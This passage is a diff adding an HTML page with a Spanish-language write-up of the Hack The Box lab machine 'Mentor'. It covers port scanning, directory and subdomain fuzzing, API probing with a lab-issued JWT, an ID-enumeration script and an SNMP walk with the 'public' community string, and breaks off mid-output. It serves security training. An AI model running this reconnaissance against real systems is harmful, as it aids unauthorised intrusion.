@@ -1,0 +1,662 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-mentor-writeup">Hack The Box: Mentor Writeup</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Mentor&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.228.102 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.228.102 -&gt; <span style="color:#f92672">[</span>22,80<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80 -sCV 10.129.228.102 -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-01 22:30 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.102
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://mentorquotes.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.88 seconds
+</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.228.102 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-01 22:32 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.102
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1493</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span>161/udp   open   snmp
+</span></span><span style="display:flex;"><span>1068/udp  closed instl_bootc
+</span></span><span style="display:flex;"><span>17989/udp closed unknown
+</span></span><span style="display:flex;"><span>22292/udp closed unknown
+</span></span><span style="display:flex;"><span>27064/udp closed unknown
+</span></span><span style="display:flex;"><span>31673/udp closed unknown
+</span></span><span style="display:flex;"><span>42313/udp closed unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.81 seconds
+</span></span></code></pre></div><p>Detectamos que está el puerto 161/UDP (SNMP) abierto, interesante.</p>
+<h1 id="http-enumeration--virtual-hosting">HTTP enumeration &amp; Virtual Hosting</h1>
+<p>Detectamos un dominio <code>mentorquotes.htb</code></p>
+<p>Detectamos que el Framework por detrás es <code>Flask</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://mentorquotes.htb
+</span></span><span style="display:flex;"><span>http://mentorquotes.htb <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Werkzeug/2.0.3 Python/3.6.9<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.228.102<span style="color:#f92672">]</span>, Python<span style="color:#f92672">[</span>3.6.9<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>MentorQuotes<span style="color:#f92672">]</span>, Werkzeug<span style="color:#f92672">[</span>2.0.3<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Tras analizar el código fuente de la página web no encuentro nada interesante. Así que decidí fuzzear en busca de nuevas rutas pero no encontré nada.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ feroxbuster -u http://mentorquotes.htb/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d <span style="color:#ae81ff">1</span> -t <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> ___  ___  __   __     __      __         __   ___
+</span></span><span style="display:flex;"><span>|__  |__  |__<span style="color:#f92672">)</span> |__<span style="color:#f92672">)</span> | /  <span style="color:#e6db74">`</span>    /  <span style="color:#ae81ff">\ \_</span>/ | |  <span style="color:#ae81ff">\ </span>|__
+</span></span><span style="display:flex;"><span>|    |___ |  <span style="color:#ae81ff">\ </span>|  <span style="color:#ae81ff">\ </span>| <span style="color:#ae81ff">\_</span>_,    <span style="color:#ae81ff">\_</span>_/ / <span style="color:#ae81ff">\ </span>| |__/ |___
+</span></span><span style="display:flex;"><span>by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 🤓                 ver: 2.10.4
+</span></span><span style="display:flex;"><span>───────────────────────────┬──────────────────────
+</span></span><span style="display:flex;"><span> 🎯  Target Url            │ http://mentorquotes.htb/
+</span></span><span style="display:flex;"><span> 🚀  Threads               │ <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span> 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> 👌  Status Codes          │ All Status Codes!
+</span></span><span style="display:flex;"><span> 💥  Timeout <span style="color:#f92672">(</span>secs<span style="color:#f92672">)</span>        │ <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span> 🦡  User-Agent            │ feroxbuster/2.10.4
+</span></span><span style="display:flex;"><span> 🔎  Extract Links         │ true
+</span></span><span style="display:flex;"><span> 🏁  HTTP methods          │ <span style="color:#f92672">[</span>GET<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> 🔃  Recursion Depth       │ <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>───────────────────────────┴──────────────────────
+</span></span><span style="display:flex;"><span> 🏁  Press <span style="color:#f92672">[</span>ENTER<span style="color:#f92672">]</span> to use the Scan Management Menu™
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">404</span>      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET      167l      621w     5506c http://mentorquotes.htb/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">404</span>      GET        9l       31w      278c http://mentorquotes.htb/http%3A%2F%2Fwww
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">##&gt;-----------------] - 78s    28178/220545  11m     found:2       errors:561</span>
+</span></span><span style="display:flex;"><span>🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_mentorquotes_htb_-1722544677.state ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">##&gt;-----------------] - 78s    28183/220545  11m     found:2       errors:561</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">##&gt;-----------------] - 78s    28174/220545  361/s   http://mentorquotes.htb/</span>
+</span></span></code></pre></div><p>Así que decidí fuzzear por subdominios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wfuzz --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span> -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span style="color:#e6db74">&#39;Host: FUZZ.mentorquotes.htb&#39;</span> http://mentorquotes.htb
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://mentorquotes.htb/
+</span></span><span style="display:flex;"><span>Total requests: 114441
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000051:   <span style="color:#ae81ff">404</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">22</span> Ch       <span style="color:#e6db74">&#34;api&#34;</span>
+</span></span></code></pre></div><p>Y encontré un subdominio <code>api</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s http://api.mentorquotes.htb/ | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#e6db74">&#34;Not Found&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="api-enumeration">API Enumeration</h1>
+<p>Con el diccionario <code>SecLists/Discovery/Web-Content/api/api-endpoints.txt</code> Encontramos varias rutas interesantes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       69l      212w     2637c http://api.mentorquotes.htb/docs/oauth2-redirect
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        1l       48w     7676c http://api.mentorquotes.htb/openapi.json
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">307</span>      GET        0l        0w        0c http://api.mentorquotes.htb/docs/ <span style="color:#f92672">=</span>&gt; http://api.mentorquotes.htb/docs
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       31l       62w      969c http://api.mentorquotes.htb/docs
+</span></span></code></pre></div><p>Esta ruta de openapi.json y /docs, me hace pensar que existe un <code>swagger</code> detrás donde a parte de los endpoints, se expone un usuario <code>james</code>.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Utilizo el endpoint de <code>/auth/signup</code> para crearme un usuario.
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Y al utilizar el endpoint de <code>/auth/login</code> obtenemos un JWT.
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>Analizando este token, no encontramos nada interesante.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Pero ahora puedo hacer solicitudes a otros endpoints para los cuales necesitaba autenticación.
+Me llama la atención el endpoint de <code>/users/</code> pero necesito una cuenta de administrador.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s http://api.mentorquotes.htb/users/ -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#e6db74">&#34;Only admin users can access this resource&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Podemos ver todas las frases que salían en el sitio web.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s http://api.mentorquotes.htb/quotes/ -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;title&#34;</span>: <span style="color:#e6db74">&#34; I believed I was good&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;I was so bad at studies in school. Teachers used to tell me that I should follow a different passion other than typical education. Nonetheless, I got rid of the negativity in myself and others and worked as hard as I could in my finals and college education. Now I am a paid accountant for a major brand in my country.&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;Find your passion before its too late&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;When I was growing up, I did not really have much, sure I enjoyed my passion but did not take it seriously. When I worked in a gas station for 3 years at that point I made a decision to go back to education and get a masters degree. Now I am a senior content engineer for a reputed company&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;Never too late&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;I was a construction worker for almost 10 years. I had to work there because I did not have any educational background to work in the academic sector. But I realized I was not getting the best of my life. So I started investing in crypto. Learned about how investing is done professionally. Soon enough I was able to give up the construction sector and start my own business. I did all this in my 60s&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;Age is just a number&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;When I was was kid, I used to create very simple video games as a hobby. Because I loved it so much, I thought to myself that I am going to be a game developer someday. With self-motivation, I applied for a job as a game designer when I just finished school. Now I work there as a permanent video game developer. And I am really proud to be the youngest employee there.&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;Its all worth it in the end&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Working as a school teacher, I had a lot of responsibilities to fulfill. Even though I really loved teaching kids, the pressure was unbearable. I had 10-hour shifts at school including all the extra classes. But I did all of them to support the kids who needed my help. Now I am retired and I can not think of anything else that I would have done except this. When I see the kids I teach come and visit me telling how they enjoyed my teaching, all the hard work I put in is worth it.&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Tampoco podemos crear ni editar una frase.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X POST http://api.mentorquotes.htb/quotes/ -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#e6db74">&#39;{&#34;title&#34;: &#34;testing&#34;, &#34;description&#34;: &#34;testing&#34;}&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#e6db74">&#34;Only admin users can access this resource&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/mentor/scan<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ curl -s -X PUT http://api.mentorquotes.htb/quotes/1/ -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#e6db74">&#39;{&#34;title&#34;: &#34;testing&#34;, &#34;description&#34;: &#34;testing&#34;}&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#e6db74">&#34;Only admin users can access this resource&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Pensé que quizás existía alguna frase oculta que no se podía ver a simple vista, así que hice un script en python para intentar descubrirlas pero no sirvió.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>python3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JWT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBvaW50ZWQiLCJlbWFpbCI6InBvaW50ZWRAcG9pbnRlZC5jb20ifQ.JDca2XQVvnl1welcPDL02FYJalCOChzoLjRRSUgZsMg&#34;</span>
+</span></span><span style="display:flex;"><span>BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://api.mentorquotes.htb/quotes/&lt;ID&gt;/&#34;</span>
+</span></span><span style="display:flex;"><span>BAD_QUOTE_LENGTH <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute</span>():
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Authorization&#34;</span>: JWT
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">200</span>):
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(BASE_URL<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&lt;ID&gt;&#34;</span>, str(i)), headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (len(r<span style="color:#f92672">.</span>text) <span style="color:#f92672">!=</span> BAD_QUOTE_LENGTH):
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[+] Quote with ID: &#34;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; exists&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    brute()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 brute.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Quote with ID: <span style="color:#ae81ff">0</span> exists
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Quote with ID: <span style="color:#ae81ff">1</span> exists
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Quote with ID: <span style="color:#ae81ff">2</span> exists
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Quote with ID: <span style="color:#ae81ff">3</span> exists
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Quote with ID: <span style="color:#ae81ff">4</span> exists
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Quote with ID: <span style="color:#ae81ff">5</span> exists
+</span></span></code></pre></div><p>Nos reporta lo que ya sabíamos..</p>
+<h1 id="snmp-enumeration">SNMP Enumeration</h1>
+<p>Como con la API no he conseguido nada, voy a enumerar el otro puerto abierto a parte del SSH, el SNMP .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ snmpbulkwalk -v 2c -c public 10.129.228.102
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysDescr.0 <span style="color:#f92672">=</span> STRING: Linux mentor 5.15.0-56-generic <span style="color:#75715e">#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysObjectID.0 <span style="color:#f92672">=</span> OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+</span></span><span style="display:flex;"><span>DISMAN-EVENT-MIB::sysUpTimeInstance <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>267066<span style="color:#f92672">)</span> 0:44:30.66
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysContact.0 <span style="color:#f92672">=</span> STRING: Me &lt;admin@mentorquotes.htb&gt;
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysName.0 <span style="color:#f92672">=</span> STRING: mentor
